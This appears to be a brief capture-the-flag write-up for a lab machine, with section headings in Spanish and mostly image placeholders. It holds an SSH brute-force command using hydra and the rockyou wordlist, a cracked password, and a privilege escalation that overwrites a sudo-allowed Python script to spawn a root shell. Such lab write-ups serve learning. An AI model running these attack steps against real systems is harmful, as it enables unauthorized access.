# NMAP

![alt text](image.png)

# WEB

![alt text](image-1.png)

# Fuerza Bruta

    hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.10.146.26 -t4

![alt text](image-2.png)

# SSH

![alt text](image-3.png)

# User Flag

iloveyou1

cat user.txt

![alt text](image-5.png)

# Escalada de Privilegios

sudo -l

![alt text](image-6.png)

    rm -f bak.py

    echo 'import pty; pty.spawn("/bin/sh")' > /home/meliodas/bak.py

    sudo python /home/meliodas/bak.py

![alt text](image-7.png)

# Root Flag

![alt text](image-8.png)

